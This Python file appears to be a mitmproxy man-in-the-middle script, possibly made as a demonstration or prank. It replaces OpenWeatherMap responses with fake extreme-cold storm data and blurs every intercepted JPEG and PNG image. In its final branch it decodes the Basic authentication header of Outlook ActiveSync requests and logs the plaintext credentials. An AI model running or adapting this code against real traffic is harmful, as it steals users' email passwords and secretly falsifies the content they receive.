import mitmproxy

from mitmproxy.models import decoded
import json
import StringIO
from PIL import Image,ImageFilter
import base64

def _blur_that(flow, _type):
  sio = StringIO.StringIO(flow.response.content)

  im = Image.open(sio).filter(ImageFilter.GaussianBlur(10))

  nsio = StringIO.StringIO()
  im.save(nsio,format=_type)

  flow.response.content = nsio.getvalue()

def response(context, flow):

  with decoded(flow.response):

    if flow.request.pretty_host == 'api.openweathermap.org':
      obj = json.loads(flow.response.content)

      if flow.request.path.startswith("/data/2.5/weather"):
        obj["weather"][0]['id'] = '901'
        obj["weather"][0]['icon'] = '11d'
        obj["main"]["temp"] = -273.15
        obj["main"]["description"] = "On est foutus"

        obj["name"] = "\\_o<"
      elif flow.request.path.startswith("/data/2.5/forecast"):
        for e in obj['list']:
          e['clouds'] = 100
          e['temp'] = {"min": -20, "max": -10, "eve": -10, "morn": -20, "night": -15, "day": -10}
          e['weather'][0]['id'] = "901"
          e['weather'][0]['icon'] = "11d"

      flow.response.content = json.dumps(obj)

    elif 'Content-Type' in flow.response.headers and flow.response.headers['Content-Type'] == 'image/jpeg':
      _blur_that(flow,"JPEG")
    elif 'Content-Type' in flow.response.headers and flow.response.headers['Content-Type'] == 'image/png':
      _blur_that(flow,"PNG")

    elif (flow.request.pretty_host == 'eas.outlook.com'
      and flow.request.path.startswith("/Microsoft-Server-ActiveSync")):
      atype,b64 = flow.request.headers['Authorization'].split(' ')

      context.log( "OUTLOOK AUTH : %s"%base64.b64decode(b64) , level='info')

  flow.reply()
